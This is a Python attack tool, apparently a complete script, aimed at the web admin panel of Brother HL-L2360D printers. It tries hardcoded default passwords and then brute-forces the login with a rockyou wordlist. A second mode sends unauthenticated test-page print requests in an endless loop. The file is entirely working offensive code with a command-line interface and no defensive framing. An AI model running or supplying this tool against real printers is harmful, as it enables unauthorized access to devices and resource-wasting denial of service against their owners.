import requests
import logging
import argparse
import time

t_format = '[%(asctime)s] %(levelname)s - %(message)s'
d_format = '%H:%M:%S'
logging.basicConfig(
    filename='ohbrother.log', 
    encoding='utf-8', 
    level=logging.INFO,
    format= t_format,
    datefmt=d_format
)
console = logging.StreamHandler()
console.setLevel(logging.DEBUG)
formatter = logging.Formatter(t_format, datefmt=d_format)
console.setFormatter(formatter)
logging.getLogger('').addHandler(console)

logger = logging.getLogger(__name__)

COMMON_PASSWORDS = ["initpass", "access"]

PASSWORD_KEY = "B1d6"

class Brother:
    def __init__(self, ip_address: str, port: int, wordlist: str) -> None:
        """ 
        :param ip_address: IP Address of the printer
        :param port: Port of the web server running on the printer
        :param wordlist: Password wordlist file
        """
        self.url = f"http://{ip_address}:{port}/"
        self.status_url = self.url + "general/status.html"
        self.wordlist = wordlist
        self.default_password = "initpass"

    def send_test_sheet(self) -> bool:
        """ Prints a test sheet
        """
        payload: dict = {
            "B10a": "",
            "pageid":4
        }
        test_sheet_url = f"{self.url}general/lists.html"
        resp = requests.post(test_sheet_url, data=payload)
        return resp.ok

    def send_spam_loop(self):
        """ Spam prints test pages
        """
        while True:
            try:
                if self.send_test_sheet():
                    logging.info("[*] queued a test page")
                else:
                    logging.error("[*] Failed to queue a test sheet")
                time.sleep(3)
            except KeyboardInterrupt:
                return

    def login(self, password: str) -> bool:
        """ Sends a login request to the printer
        """
        payload: dict = {
            PASSWORD_KEY: password,
            "loginurl":"/general/"
        }
        resp = requests.post(self.status_url, data=payload)
        # The loginurl is invalid so we get a 404 when we login successfully
        return resp.status_code == 404

    def try_default_passwords(self) -> bool:
        for password in COMMON_PASSWORDS:
            if self.login(password):
                logging.info(f"[*] default password was set: {self.default_password}")
                return True
        return False

    def dictionary_attack(self) -> bool:
        """ Attempts a dictionary attack on the printer
        :param wordlist: Wordlist file
        :return: The password if found
        """
        if self.try_default_passwords():
            return True
        logging.info(f"[*] Starting a dictionary attack on {self.url}")
        with open(self.wordlist, encoding="latin-1") as f:
            for line in f.readlines():
                line = line.strip()
                logging.debug(f"[-] invalid password: {line}")
                if self.login(line):
                    logging.info(f"[*] found correct password: {line}")
                    return True
        logging.error("[-] Failed to find a valid password")
        return False

def main(args):
    ip_address = args.get("ip_address")
    wordlist = args.get("wordlist")
    port = args.get("port")
    brother = Brother(ip_address, port, wordlist)
    if args.get("dictionary_attack"):
        return brother.dictionary_attack()
    if args.get("print_spam"):
        brother.send_spam_loop()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brother Printer Admin Panel Dictionary attack (Designed for the HL-L2360D series)")
    parser.add_argument(
        "--ip-address",
        "-i",
        help=f"IP Address of the printer", 
        required=True
    )
    parser.add_argument(
        "--port",
        "-p",
        help=f"Port the admin interface is running on (default: 80)", 
        default=80,
        type=int
    )
    parser.add_argument(
        "--dictionary-attack",
        "-D",
        help=f"IP Address of the printer", 
        action="store_true",
        default=False
    )
    parser.add_argument(
        "--print-spam",
        "-S",
        help=f"continuously print test pages (unauthenticated)", 
        default=False,
        action="store_true"
    )
    parser.add_argument(
        "--wordlist",
        "-W",
        help=f"Wordlist to use to attack the printer (default: /usr/share/wordlists/rockyou.txt)", 
        default="/usr/share/wordlists/rockyou.txt",
    )
    args = parser.parse_args()
    main(vars(args))
